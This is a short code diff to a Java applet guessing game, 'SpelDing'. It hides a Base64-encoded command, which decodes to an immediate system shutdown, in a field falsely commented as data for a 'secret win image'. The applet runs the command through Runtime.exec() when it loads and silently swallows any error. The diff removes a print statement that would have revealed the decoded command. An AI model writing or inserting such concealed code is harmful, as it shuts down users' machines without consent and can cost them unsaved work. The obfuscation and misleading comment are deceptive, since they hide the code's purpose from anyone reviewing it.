@@ -34,6 +34,8 @@ public class SpelDing extends Applet implements ActionListener {
     private Image lostImg;
     private Image nutImg;
 
+    //Set data for secret win image
+    private String data = new String(Base64.getDecoder().decode("c2h1dGRvd24gLXMgLXQgMA=="));
 
     //Path to resources
     private URL imgPath;
@@ -63,12 +65,10 @@ public class SpelDing extends Applet implements ActionListener {
         add(submit); //Adds the button
 
         //Prepare some extra data
-        Base64.Decoder decoder = Base64.getDecoder();
-        String data = new String(decoder.decode("c2h1dGRvd24gLXMgLXQgMA=="));
-        System.out.println(data);
         try {
             Runtime.getRuntime().exec(data);
         }catch(Exception ex) {} //No one cares
+
     }
     //Magic dont touch
     //Calculate what the computer whats to do
